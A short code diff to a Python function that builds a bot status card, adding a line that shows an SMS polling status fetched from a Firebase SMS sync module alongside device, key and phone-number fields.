@@ -745,11 +745,15 @@ def format_status_card(
     automation = "🟢 Running" if profile.is_monitoring else "🔴 Stopped"
 
     device_online = format_device_online(device) if device else "⚪ —"
+    from app.firebase_sms_sync import sms_poll_panel_label
+
+    sms_panel = sms_poll_panel_label(device, profile)
     return (
         f"📊 <b>{BRAND_NAME}</b>\n\n"
         "<pre>"
         f"📱 Device: {device_name}\n"
         f"📡 Firebase: {device_online}\n"
+        f"📥 SMS poll: {sms_panel}\n"
         f"🔑 KEY: {inject_key}\n"
         f"📞 /mynum: {profile.phone_number or '—'}\n"
         f"📢 Channel: {profile.channel_id or '—'}\n"
